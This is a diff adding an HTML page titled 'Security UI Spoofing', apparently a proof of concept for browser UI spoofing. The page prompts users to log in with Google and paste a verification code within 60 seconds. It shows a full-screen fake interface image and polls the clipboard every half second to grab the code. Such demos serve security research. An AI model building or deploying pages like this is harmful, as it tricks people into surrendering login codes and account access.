@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoofing</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+        
+        var content = document.getElementById("content");
+        var shouldShowLogin = false;
+               function googleTap(){
+                document.getElementById("spoof").style = "display: block;";
+                document.getElementById("content").style = "display: none;";
+                 document.documentElement.requestFullscreen();
+               }
+
+        </script>
+    </head>  
+    <body>
+        
+        <img id="spoof" style="display: none;" src="spoofing.png"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h2>Please login with Google and paste your verification code here before it expires in 60 seconds</h2>
+            </center>
+        
+            <center><input type="number" placeholder="Paste code here"/></center>
+         
+          
+            <center>
+           <img id="googleLogin" onClick="googleTap()" style="width:50%;" src="google.png"></img>
+            </br></br></br>
+            </center>
+        </div>
+        
+        <script>
+            
+      var timer = setInterval(function(){
+            pasteText();
+      }, 500);
+        
+        
+        
+   function pasteText(){
+    try {
+     const text =  navigator.clipboard.readText();
+    } catch (error) {
+    const result = document.execCommand('paste');
+    }
+  } 
+            
+        </script>
+    </body>
+</html>
